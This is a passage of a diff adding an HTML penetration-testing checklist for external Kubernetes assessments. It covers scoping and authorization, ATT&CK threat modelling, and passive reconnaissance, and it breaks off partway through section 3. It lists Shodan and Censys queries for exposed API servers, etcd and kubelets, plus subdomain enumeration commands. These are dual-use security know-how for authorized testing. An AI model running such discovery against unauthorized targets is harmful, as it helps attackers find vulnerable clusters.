@@ -1,0 +1,2080 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>K8s External Pentest Guide</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow:wght@300;400;600;700;900&family=Barlow+Condensed:wght@700;900&display=swap');
+
+  :root {
+    --bg:        #0a0c0f;
+    --bg2:       #0f1318;
+    --bg3:       #141920;
+    --border:    #1e2830;
+    --border2:   #263040;
+    --accent:    #00e5ff;
+    --accent2:   #ff3b6b;
+    --accent3:   #39ff14;
+    --warn:      #ffb800;
+    --muted:     #4a6070;
+    --text:      #c8d8e8;
+    --text2:     #7a9ab0;
+    --head:      #e8f4ff;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-weight: 300;
+    font-size: 14px;
+    line-height: 1.7;
+    min-height: 100vh;
+  }
+
+  /* ── SCAN LINE overlay ── */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,229,255,.012) 2px,
+      rgba(0,229,255,.012) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ── HEADER ── */
+  header {
+    background: linear-gradient(135deg, #080b10 0%, #0d1520 60%, #091018 100%);
+    border-bottom: 1px solid var(--border2);
+    padding: 40px 48px 32px;
+    position: relative;
+    overflow: hidden;
+  }
+  header::after {
+    content: 'K8S';
+    position: absolute; right: -10px; top: -20px;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-size: 180px; font-weight: 900;
+    color: rgba(0,229,255,.03);
+    letter-spacing: -8px;
+    pointer-events: none;
+    user-select: none;
+  }
+
+  .header-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 12px;
+    opacity: .8;
+  }
+  header h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-size: clamp(32px, 5vw, 58px);
+    font-weight: 900;
+    color: var(--head);
+    letter-spacing: -1px;
+    line-height: 1.1;
+    margin-bottom: 14px;
+  }
+  header h1 span { color: var(--accent); }
+  .header-meta {
+    display: flex; gap: 24px; flex-wrap: wrap;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px; color: var(--muted);
+  }
+  .header-meta span { display: flex; align-items: center; gap: 6px; }
+  .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent3); display: inline-block; }
+
+  /* ── LAYOUT ── */
+  .layout { display: flex; min-height: calc(100vh - 160px); }
+
+  /* ── SIDEBAR ── */
+  nav {
+    width: 260px;
+    flex-shrink: 0;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    padding: 24px 0;
+    position: sticky;
+    top: 0;
+    height: 100vh;
+    overflow-y: auto;
+  }
+  nav::-webkit-scrollbar { width: 4px; }
+  nav::-webkit-scrollbar-track { background: transparent; }
+  nav::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+
+  .nav-section-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px; letter-spacing: 3px;
+    color: var(--muted); text-transform: uppercase;
+    padding: 16px 20px 6px;
+  }
+  nav a {
+    display: flex; align-items: center; gap: 10px;
+    padding: 7px 20px;
+    color: var(--text2);
+    text-decoration: none;
+    font-size: 12.5px; font-weight: 400;
+    border-left: 2px solid transparent;
+    transition: all .15s;
+  }
+  nav a:hover { color: var(--accent); border-left-color: var(--accent); background: rgba(0,229,255,.04); }
+  nav a.active { color: var(--accent); border-left-color: var(--accent); background: rgba(0,229,255,.07); }
+  .nav-num {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px; color: var(--muted);
+    min-width: 18px;
+  }
+
+  /* ── MAIN ── */
+  main { flex: 1; padding: 0; overflow: hidden; }
+
+  /* ── PROGRESS BAR ── */
+  .progress-bar-wrap {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 12px 32px;
+    display: flex; align-items: center; gap: 16px;
+    position: sticky; top: 0; z-index: 100;
+  }
+  .progress-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px; color: var(--muted);
+    white-space: nowrap;
+  }
+  .progress-track {
+    flex: 1; height: 4px;
+    background: var(--border2);
+    border-radius: 2px;
+    overflow: hidden;
+  }
+  .progress-fill {
+    height: 100%; width: 0%;
+    background: linear-gradient(90deg, var(--accent), var(--accent3));
+    border-radius: 2px;
+    transition: width .4s ease;
+  }
+  .progress-pct {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px; color: var(--accent);
+    min-width: 36px; text-align: right;
+  }
+
+  /* ── SECTION ── */
+  .section {
+    border-bottom: 1px solid var(--border);
+  }
+  .section-header {
+    display: flex; align-items: center; gap: 16px;
+    padding: 22px 32px;
+    cursor: pointer;
+    user-select: none;
+    transition: background .15s;
+    background: var(--bg2);
+  }
+  .section-header:hover { background: var(--bg3); }
+  .section-num {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-size: 28px; font-weight: 900;
+    color: var(--border2);
+    min-width: 40px;
+    line-height: 1;
+  }
+  .section-title-wrap { flex: 1; }
+  .section-title {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-size: 20px; font-weight: 700;
+    color: var(--head); letter-spacing: .3px;
+  }
+  .section-sub {
+    font-size: 11px; color: var(--text2);
+    margin-top: 2px;
+    font-family: 'Share Tech Mono', monospace;
+  }
+  .section-badge {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px; letter-spacing: 1px;
+    padding: 3px 10px; border-radius: 2px;
+    border: 1px solid;
+  }
+  .badge-scope   { color: var(--accent);  border-color: var(--accent);  background: rgba(0,229,255,.06); }
+  .badge-recon   { color: #a78bfa;        border-color: #a78bfa;        background: rgba(167,139,250,.06); }
+  .badge-enum    { color: var(--warn);    border-color: var(--warn);    background: rgba(255,184,0,.06); }
+  .badge-exploit { color: var(--accent2); border-color: var(--accent2); background: rgba(255,59,107,.06); }
+  .badge-crit    { color: var(--accent3); border-color: var(--accent3); background: rgba(57,255,20,.06); }
+  .badge-post    { color: #f97316;        border-color: #f97316;        background: rgba(249,115,22,.06); }
+
+  .chevron {
+    font-size: 18px; color: var(--muted);
+    transition: transform .25s;
+    font-family: 'Share Tech Mono', monospace;
+  }
+  .section.open .chevron { transform: rotate(90deg); }
+
+  .section-body {
+    display: none;
+    background: var(--bg);
+    padding: 0 32px 32px;
+  }
+  .section.open .section-body { display: block; }
+
+  /* ── PHASE TAG ── */
+  .phase-intro {
+    padding: 16px 0 20px;
+    font-size: 13px; color: var(--text2);
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 24px;
+    line-height: 1.8;
+  }
+
+  /* ── SUBSECTION ── */
+  .subsection { margin-bottom: 28px; }
+  .subsection-title {
+    font-family: 'Barlow', sans-serif;
+    font-size: 13px; font-weight: 700;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    margin-bottom: 12px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .subsection-title::before {
+    content: '//';
+    color: var(--muted);
+    font-family: 'Share Tech Mono', monospace;
+    font-weight: 400;
+  }
+
+  /* ── CHECK ITEMS ── */
+  .checklist { list-style: none; display: flex; flex-direction: column; gap: 6px; }
+  .check-item {
+    display: flex; align-items: flex-start; gap: 10px;
+    padding: 8px 12px;
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    background: var(--bg2);
+    transition: border-color .15s, background .15s;
+    cursor: pointer;
+  }
+  .check-item:hover { border-color: var(--border2); background: var(--bg3); }
+  .check-item.checked { border-color: rgba(57,255,20,.2); background: rgba(57,255,20,.03); }
+  .check-item input[type=checkbox] { display: none; }
+  .check-box {
+    width: 16px; height: 16px; min-width: 16px;
+    border: 1px solid var(--muted);
+    border-radius: 2px;
+    margin-top: 1px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 10px;
+    color: var(--accent3);
+    transition: all .15s;
+  }
+  .check-item.checked .check-box {
+    background: rgba(57,255,20,.15);
+    border-color: var(--accent3);
+  }
+  .check-text { flex: 1; font-size: 13px; }
+  .check-text strong { color: var(--head); font-weight: 600; }
+  .check-note { font-size: 11px; color: var(--text2); margin-top: 2px; font-style: italic; }
+
+  /* ── CODE BLOCKS ── */
+  .cmd-block {
+    margin: 8px 0;
+    background: #060a0d;
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    border-radius: 3px;
+    overflow: hidden;
+  }
+  .cmd-block.warn-block { border-left-color: var(--warn); }
+  .cmd-block.crit-block { border-left-color: var(--accent2); }
+  .cmd-block.info-block { border-left-color: #a78bfa; }
+
+  .cmd-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 5px 12px;
+    background: rgba(255,255,255,.02);
+    border-bottom: 1px solid var(--border);
+  }
+  .cmd-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px; color: var(--muted);
+    letter-spacing: 1px;
+  }
+  .copy-btn {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px; color: var(--accent);
+    background: none; border: 1px solid rgba(0,229,255,.2);
+    padding: 2px 8px; border-radius: 2px;
+    cursor: pointer; transition: all .15s;
+    letter-spacing: .5px;
+  }
+  .copy-btn:hover { background: rgba(0,229,255,.1); }
+  .copy-btn.copied { color: var(--accent3); border-color: var(--accent3); }
+  pre {
+    padding: 12px 14px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--text);
+    overflow-x: auto;
+    white-space: pre;
+    line-height: 1.6;
+  }
+  pre .c { color: var(--muted); font-style: italic; }
+  pre .k { color: var(--accent); }
+  pre .s { color: var(--accent3); }
+  pre .w { color: var(--warn); }
+  pre .e { color: var(--accent2); }
+
+  /* ── CALLOUT BOXES ── */
+  .callout {
+    padding: 12px 16px;
+    border-radius: 3px;
+    margin: 12px 0;
+    font-size: 12.5px;
+    line-height: 1.7;
+    display: flex; gap: 10px;
+  }
+  .callout-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+  .callout.tip    { background: rgba(0,229,255,.05); border: 1px solid rgba(0,229,255,.15); }
+  .callout.warn   { background: rgba(255,184,0,.05); border: 1px solid rgba(255,184,0,.2); }
+  .callout.danger { background: rgba(255,59,107,.05); border: 1px solid rgba(255,59,107,.2); }
+  .callout.info   { background: rgba(167,139,250,.05); border: 1px solid rgba(167,139,250,.2); }
+  .callout.tip   .callout-icon { color: var(--accent); }
+  .callout.warn  .callout-icon { color: var(--warn); }
+  .callout.danger .callout-icon { color: var(--accent2); }
+  .callout.info  .callout-icon { color: #a78bfa; }
+
+  /* ── TABLE ── */
+  .tbl-wrap { overflow-x: auto; margin: 10px 0; }
+  table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
+  th {
+    background: var(--bg2);
+    color: var(--accent);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px; letter-spacing: 1.5px; text-transform: uppercase;
+    padding: 8px 12px; text-align: left;
+    border: 1px solid var(--border);
+  }
+  td {
+    padding: 7px 12px;
+    border: 1px solid var(--border);
+    vertical-align: top;
+    color: var(--text);
+  }
+  tr:nth-child(even) td { background: rgba(255,255,255,.015); }
+  td code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    background: rgba(0,229,255,.06);
+    padding: 1px 5px; border-radius: 2px;
+  }
+
+  /* ── RISK BADGE ── */
+  .risk {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px; padding: 2px 7px; border-radius: 2px;
+    font-weight: 700; letter-spacing: .5px;
+  }
+  .risk-c { background: rgba(255,59,107,.15); color: var(--accent2); border: 1px solid rgba(255,59,107,.3); }
+  .risk-h { background: rgba(255,184,0,.12); color: var(--warn); border: 1px solid rgba(255,184,0,.3); }
+  .risk-m { background: rgba(0,229,255,.1); color: var(--accent); border: 1px solid rgba(0,229,255,.25); }
+  .risk-l { background: rgba(57,255,20,.08); color: var(--accent3); border: 1px solid rgba(57,255,20,.2); }
+
+  /* ── TOOLBAR ── */
+  .toolbar {
+    display: flex; gap: 10px; flex-wrap: wrap;
+    padding: 16px 32px;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+  }
+  .toolbar-btn {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px; letter-spacing: 1px;
+    padding: 6px 14px; border-radius: 2px;
+    border: 1px solid var(--border2);
+    color: var(--text2); background: var(--bg3);
+    cursor: pointer; transition: all .15s;
+    text-transform: uppercase;
+  }
+  .toolbar-btn:hover { border-color: var(--accent); color: var(--accent); }
+  .toolbar-btn.danger-btn { border-color: rgba(255,59,107,.3); color: var(--accent2); }
+  .toolbar-btn.danger-btn:hover { background: rgba(255,59,107,.08); }
+
+  /* ── SEARCH ── */
+  .search-wrap {
+    padding: 14px 32px;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+  }
+  .search-input {
+    width: 100%; max-width: 480px;
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    padding: 8px 14px;
+    border-radius: 3px;
+    outline: none;
+    transition: border-color .15s;
+  }
+  .search-input:focus { border-color: var(--accent); }
+  .search-input::placeholder { color: var(--muted); }
+
+  /* ── NOTES ── */
+  .notes-area {
+    width: 100%; min-height: 70px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    padding: 10px 12px;
+    border-radius: 3px;
+    resize: vertical;
+    margin-top: 10px;
+    outline: none;
+    transition: border-color .15s;
+    line-height: 1.6;
+  }
+  .notes-area:focus { border-color: var(--accent); }
+  .notes-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px; color: var(--muted);
+    text-transform: uppercase; letter-spacing: 1px;
+    margin-top: 14px;
+  }
+
+  /* ── FOOTER ── */
+  footer {
+    background: var(--bg2);
+    border-top: 1px solid var(--border);
+    padding: 20px 32px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px; color: var(--muted);
+    text-align: center;
+  }
+
+  /* ── HIGHLIGHT for search ── */
+  mark { background: rgba(255,184,0,.25); color: var(--warn); border-radius: 2px; padding: 0 2px; }
+
+  /* ── Responsive ── */
+  @media (max-width: 860px) {
+    nav { display: none; }
+    header { padding: 24px 20px; }
+    .section-header { padding: 16px 20px; }
+    .section-body { padding: 0 20px 24px; }
+    .toolbar { padding: 12px 20px; }
+    .search-wrap { padding: 10px 20px; }
+    .progress-bar-wrap { padding: 10px 20px; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-tag">// Security Assessment Framework v1.0</div>
+  <h1>External <span>Kubernetes</span><br>Penetration Testing</h1>
+  <div class="header-meta">
+    <span><span class="dot"></span> NIST SP 800-115 Aligned</span>
+    <span><span class="dot" style="background:var(--accent)"></span> CIS Kubernetes Benchmark</span>
+    <span><span class="dot" style="background:var(--accent2)"></span> OWASP K8s Security Cheat Sheet</span>
+    <span><span class="dot" style="background:var(--warn)"></span> MITRE ATT&amp;CK for Containers</span>
+  </div>
+</header>
+
+<div class="layout">
+
+<!-- SIDEBAR NAV -->
+<nav id="sidebar">
+  <div class="nav-section-label">Pre-Engagement</div>
+  <a href="#s1"><span class="nav-num">01</span> Scoping &amp; RoE</a>
+  <a href="#s2"><span class="nav-num">02</span> Threat Modelling</a>
+
+  <div class="nav-section-label">Reconnaissance</div>
+  <a href="#s3"><span class="nav-num">03</span> Passive Recon</a>
+  <a href="#s4"><span class="nav-num">04</span> Active Enumeration</a>
+
+  <div class="nav-section-label">Attack Surface</div>
+  <a href="#s5"><span class="nav-num">05</span> API Server Attacks</a>
+  <a href="#s6"><span class="nav-num">06</span> etcd Attacks</a>
+  <a href="#s7"><span class="nav-num">07</span> Kubelet Attacks</a>
+  <a href="#s8"><span class="nav-num">08</span> Dashboard &amp; UI</a>
+  <a href="#s9"><span class="nav-num">09</span> Ingress &amp; Exposed Services</a>
+  <a href="#s10"><span class="nav-num">10</span> Cloud Metadata Abuse</a>
+
+  <div class="nav-section-label">Post-Compromise</div>
+  <a href="#s11"><span class="nav-num">11</span> Container Escape</a>
+  <a href="#s12"><span class="nav-num">12</span> Privilege Escalation</a>
+  <a href="#s13"><span class="nav-num">13</span> Lateral Movement</a>
+  <a href="#s14"><span class="nav-num">14</span> Persistence</span></a>
+  <a href="#s15"><span class="nav-num">15</span> Exfiltration</a>
+
+  <div class="nav-section-label">Reporting</div>
+  <a href="#s16"><span class="nav-num">16</span> Documentation &amp; Reporting</a>
+</nav>
+
+<main>
+  <!-- PROGRESS -->
+  <div class="progress-bar-wrap">
+    <span class="progress-label">PROGRESS</span>
+    <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+    <span class="progress-pct" id="progressPct">0%</span>
+  </div>
+
+  <!-- TOOLBAR -->
+  <div class="toolbar">
+    <button class="toolbar-btn" onclick="expandAll()">EXPAND ALL</button>
+    <button class="toolbar-btn" onclick="collapseAll()">COLLAPSE ALL</button>
+    <button class="toolbar-btn" onclick="checkAll()">CHECK ALL</button>
+    <button class="toolbar-btn danger-btn" onclick="clearAll()">RESET</button>
+    <button class="toolbar-btn" onclick="exportNotes()">EXPORT NOTES</button>
+  </div>
+
+  <!-- SEARCH -->
+  <div class="search-wrap">
+    <input class="search-input" type="text" id="searchInput" placeholder="Search commands, techniques, CVEs..." oninput="doSearch(this.value)">
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 1: SCOPING -->
+  <!-- ============================================================ -->
+  <div class="section open" id="s1">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">01</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Scoping &amp; Rules of Engagement</div>
+        <div class="section-sub">Pre-engagement · Authorization · Legal</div>
+      </div>
+      <span class="section-badge badge-scope">PRE-ENGAGEMENT</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">
+        Scoping defines the boundaries of the engagement. For Kubernetes, scope must explicitly address
+        every layer: cloud infrastructure, DNS/network ranges, the control plane, data plane, workloads,
+        and any connected managed services. Vague scope leads to missed assets or legal risk.
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Written Authorization Requirements</div>
+        <ul class="checklist">
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Signed Rules of Engagement (RoE) document</strong> — includes explicit list of in-scope IPs, FQDNs, and cloud accounts<div class="check-note">Never proceed without written, signed RoE from an authorized representative (not just IT)</div></div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Cloud provider notification</strong> — AWS, GCP, Azure all require prior approval for pen tests on managed Kubernetes (EKS, GKE, AKS)<div class="check-note">File AWS/GCP/Azure pen test request forms; some allow automatic approval for specific actions, others require manual approval</div></div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Emergency stop contacts</strong> — 24/7 reachable security/ops contact defined; kill-switch process agreed</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Data handling agreement</strong> — what happens to credentials, PII, secrets found during testing<div class="check-note">Especially critical if secrets or private keys are discovered in cluster configs or images</div></div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Third-party / shared infrastructure confirmation</strong> — confirm shared nodes, managed services, CDN providers are explicitly in or out of scope</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Destructive testing authorization</strong> — explicit written permission for DoS simulation, node disruption, or pod deletion if in scope</div></li>
+        </ul>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Scope Definition Checklist</div>
+        <div class="tbl-wrap">
+        <table>
+          <tr><th>Asset Category</th><th>What to Clarify in Scope</th><th>Examples</th></tr>
+          <tr><td>Control Plane</td><td>API server IP/port, etcd endpoints, controller-manager, scheduler</td><td><code>10.0.0.1:6443</code>, cloud LB FQDN</td></tr>
+          <tr><td>Worker Nodes</td><td>Node IP ranges, Kubelet port (10250/10255)</td><td><code>10.0.1.0/24</code></td></tr>
+          <tr><td>Ingress / LB</td><td>External IPs, hostnames, WAF status</td><td><code>*.example.com</code>, NLB ARNs</td></tr>
+          <tr><td>Container Registry</td><td>ECR, GCR, Harbor — read access allowed?</td><td><code>registry.example.com</code></td></tr>
+          <tr><td>Namespaces</td><td>All namespaces or subset; production excluded?</td><td><code>dev, staging</code></td></tr>
+          <tr><td>Cloud Account</td><td>Account IDs, IAM boundary, managed service APIs</td><td>AWS account <code>123456789012</code></td></tr>
+          <tr><td>CI/CD Pipelines</td><td>Jenkins, ArgoCD, FluxCD — are they in scope?</td><td><code>argocd.internal.example.com</code></td></tr>
+          <tr><td>Monitoring Stack</td><td>Prometheus, Grafana, Jaeger — are exposed UIs in scope?</td><td><code>grafana.example.com</code></td></tr>
+        </table>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Timing &amp; Testing Windows</div>
+        <ul class="checklist">
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Agreed testing window</strong> — business hours vs. out-of-hours; blackout dates (release days, peak traffic events)</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Rate limiting exemptions</strong> — tester source IPs whitelisted in WAF / DDoS protection to avoid false blocking</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Alert suppression agreement</strong> — which SIEM/SOC alerts to suppress vs. leave live (blue team exercise vs. stealth test)</div></li>
+        </ul>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Tester Credential Pre-provisioning</div>
+        <ul class="checklist">
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Kubeconfig / service account tokens</strong> — define starting privilege level (unauthenticated, low-priv SA, read-only cluster-viewer)</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Cloud credentials</strong> — define IAM role or user with minimum starting access for cloud-layer testing</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>VPN / jump host access</strong> — if cluster is private, confirm network access path before engagement starts</div></li>
+        </ul>
+      </div>
+
+      <div class="callout warn">
+        <span class="callout-icon">⚠</span>
+        <div><strong>Cloud provider ToS:</strong> AWS, GCP, and Azure have specific terms prohibiting certain attack types even with customer permission. Review each provider's penetration testing policy — some attack simulations (volumetric DoS, BGP hijacking) are never permitted regardless of scope agreement.</div>
+      </div>
+
+      <div class="notes-label">// ENGAGEMENT NOTES</div>
+      <textarea class="notes-area" id="notes-s1" placeholder="Paste RoE details, client contacts, authorized IP ranges, testing window..." oninput="saveNote('s1',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 2: THREAT MODELLING -->
+  <!-- ============================================================ -->
+  <div class="section" id="s2">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">02</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Threat Modelling &amp; Attack Surface Mapping</div>
+        <div class="section-sub">STRIDE · MITRE ATT&amp;CK Containers · Risk Prioritisation</div>
+      </div>
+      <span class="section-badge badge-scope">PRE-ENGAGEMENT</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">Map the target architecture before touching anything. Understand the deployment model (self-managed, managed cloud service), network topology, trust boundaries, and the MITRE ATT&amp;CK for Containers matrix entry points relevant to an external attacker.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">Architecture Questions to Answer First</div>
+        <ul class="checklist">
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Is the API server publicly exposed?</strong> — Most critical question. Check <code>:6443</code> on known IPs and cloud LB FQDNs</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Managed vs. self-managed</strong> — EKS/GKE/AKS restrict access to etcd; self-managed clusters may expose it directly</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Authentication mechanisms in use</strong> — mTLS, OIDC, static tokens, client certificates, webhook</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Network Policy enforcement</strong> — Calico, Cilium, Weave — are east-west controls present?</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Service Mesh</strong> — Istio, Linkerd — mTLS between pods may complicate lateral movement</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Admission controllers in use</strong> — OPA Gatekeeper, Kyverno, PodSecurity, ImagePolicyWebhook</div></li>
+        </ul>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">MITRE ATT&amp;CK for Containers — External Entry Points</div>
+        <div class="tbl-wrap">
+        <table>
+          <tr><th>Tactic</th><th>Technique</th><th>ATT&amp;CK ID</th><th>Risk</th></tr>
+          <tr><td>Initial Access</td><td>Exposed API Server (no auth)</td><td>T1190</td><td><span class="risk risk-c">CRIT</span></td></tr>
+          <tr><td>Initial Access</td><td>Valid Accounts (leaked kubeconfig/token)</td><td>T1078</td><td><span class="risk risk-c">CRIT</span></td></tr>
+          <tr><td>Initial Access</td><td>Exploit Public-Facing Application (ingress)</td><td>T1190</td><td><span class="risk risk-h">HIGH</span></td></tr>
+          <tr><td>Initial Access</td><td>Exposed Dashboard (no auth)</td><td>T1190</td><td><span class="risk risk-c">CRIT</span></td></tr>
+          <tr><td>Initial Access</td><td>Exposed Kubelet API</td><td>T1190</td><td><span class="risk risk-h">HIGH</span></td></tr>
+          <tr><td>Execution</td><td>Deploy Container (via API)</td><td>T1610</td><td><span class="risk risk-c">CRIT</span></td></tr>
+          <tr><td>Execution</td><td>Exec Into Container</td><td>T1609</td><td><span class="risk risk-h">HIGH</span></td></tr>
+          <tr><td>Privilege Escalation</td><td>Cluster-admin via RBAC misconfiguration</td><td>T1548</td><td><span class="risk risk-c">CRIT</span></td></tr>
+          <tr><td>Credential Access</td><td>Container &amp; Resource Discovery (secrets)</td><td>T1552.007</td><td><span class="risk risk-h">HIGH</span></td></tr>
+          <tr><td>Lateral Movement</td><td>Container API (spawn pods on nodes)</td><td>T1610</td><td><span class="risk risk-h">HIGH</span></td></tr>
+        </table>
+        </div>
+      </div>
+
+      <div class="notes-label">// ARCHITECTURE NOTES</div>
+      <textarea class="notes-area" id="notes-s2" placeholder="Document deployment type, cloud provider, network topology, known tech stack..." oninput="saveNote('s2',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 3: PASSIVE RECON -->
+  <!-- ============================================================ -->
+  <div class="section" id="s3">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">03</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Passive Reconnaissance</div>
+        <div class="section-sub">OSINT · Certificate Transparency · Shodan · GitHub Leaks</div>
+      </div>
+      <span class="section-badge badge-recon">RECON</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">Gather intelligence without directly touching target infrastructure. The goal is to map exposed Kubernetes infrastructure, leaked credentials, and misconfigured services before active scanning begins.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">Shodan / Censys — Kubernetes Asset Discovery</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">SHODAN QUERIES</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Find exposed Kubernetes API servers</span>
+product:"kubernetes" port:6443
+ssl.cert.subject.cn:"kubernetes" port:6443
+
+<span class="c"># Find exposed etcd instances</span>
+product:"etcd" port:2379
+port:2379 "etcd"
+
+<span class="c"># Find exposed Kubernetes Dashboards</span>
+http.title:"Kubernetes Dashboard"
+http.favicon.hash:1726265433
+
+<span class="c"># Find exposed Kubelet APIs</span>
+port:10250 ssl "kubelet"
+port:10255 "kubelet"
+
+<span class="c"># Find exposed Prometheus (often co-located with k8s)</span>
+http.title:"Prometheus" port:9090</pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">CENSYS QUERIES</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Censys Search (web UI or API)</span>
+services.port=6443 and services.tls.certificates.leaf_data.subject_dn="kubernetes"
+services.port=2379 and services.service_name="ETCD"</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Certificate Transparency &amp; DNS Enumeration</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">AMASS / SUBFINDER / CERT TRANSPARENCY</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Enumerate subdomains (find k8s-related FQDNs)</span>
+amass enum -passive -d target.com -o amass_out.txt
+
+subfinder -d target.com -silent -o subfinder_out.txt
+
+<span class="c"># Certificate transparency — look for k8s-related names</span>
+curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
+  jq '.[].name_value' | grep -Ei 'kube|k8s|api|argocd|grafana|rancher'
+
+<span class="c"># DNS brute-force for common k8s hostnames</span>
+dnsx -l subfinder_out.txt -a -resp -o resolved.txt
+
+<span class="c"># Common k8s-related subdomain patterns</span>
